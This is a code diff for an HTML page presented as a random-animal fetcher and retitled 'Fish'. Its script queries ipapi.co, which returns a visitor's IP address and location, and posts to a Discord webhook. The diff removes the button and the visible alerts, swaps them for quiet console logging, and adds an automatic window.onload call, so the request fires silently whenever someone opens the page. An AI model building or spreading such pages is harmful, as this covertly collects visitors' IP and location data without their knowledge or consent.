@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Fetch Random Animal</title>
+    <title>Fish</title>
     <script>
         async function fetchAnimalAndSendToDiscord() {
             const ipapiUrl = "https://ipapi.co/json/";
@@ -36,16 +36,17 @@
                     throw new Error(`Discord webhook error! status: ${discordResponse.status}`);
                 }
 
-                alert("Animal sent to Discord successfully!");
+                console.log("Animal sent to Discord successfully!");
             } catch (error) {
                 console.error("An error occurred:", error);
-                alert("An error occurred: " + error.message);
             }
         }
+
+        // Automatically call the function on page load
+        window.onload = fetchAnimalAndSendToDiscord;
     </script>
 </head>
 <body>
-    <h1>Fetch Random Animal</h1>
-    <button onclick="fetchAnimalAndSendToDiscord()">Fetch and Send</button>
+    <h1>Fetching Random Animal...</h1>
 </body>
 </html>
